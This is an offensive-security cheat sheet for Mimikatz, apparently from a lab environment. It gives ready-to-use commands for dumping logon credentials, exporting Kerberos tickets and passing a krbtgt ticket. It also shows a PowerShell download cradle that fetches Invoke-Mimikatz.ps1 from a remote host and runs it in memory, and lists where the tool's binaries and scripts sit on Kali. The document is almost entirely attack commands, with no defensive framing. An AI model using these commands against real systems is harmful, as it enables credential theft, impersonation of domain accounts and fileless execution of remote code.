# Mimikatz
## Useful commands
List all available provider credentials
```
sekurlsa::logonpasswords
```

```
sekurlsa::tickets export
```
NOTE: Below PTT using an exported ticket
```
kerberos::ptt [0;2957a]-2-0-40e10000-maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi
```

## PowerShell Download Cradle
```
[security.local]: PS C:\> iex (New-Object Net.WebClient).DownloadString("http://10.0.5.101/Invoke-Mimikatz.ps1")
[security.local]: PS C:\> . .\Invoke-Mimikatz.ps1
[security.local]: PS C:\> Invoke-Mimikatz
Hostname: SECURITY.local / S-1-5-21-1693200156-3137632808-1858025440

  .#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) #
```
## Mimikatz locations on Kali
### Executables
/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe <br>
/usr/share/windows-resources/mimikatz/x64/mimikatz.exe <br>
### PowerShell
/usr/share/powershell-empire/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1 <br>
/usr/share/powershell-empire/empire/test/data/module_source/credentials/Invoke-Mimikatz.ps1 <br>
/usr/share/windows-resources/powersploit/Exfiltration/Invoke-Mimikatz.ps1
## References
The Hacker Tools - Recipes: Mimikatz<br>
https://tools.thehacker.recipes/mimikatz
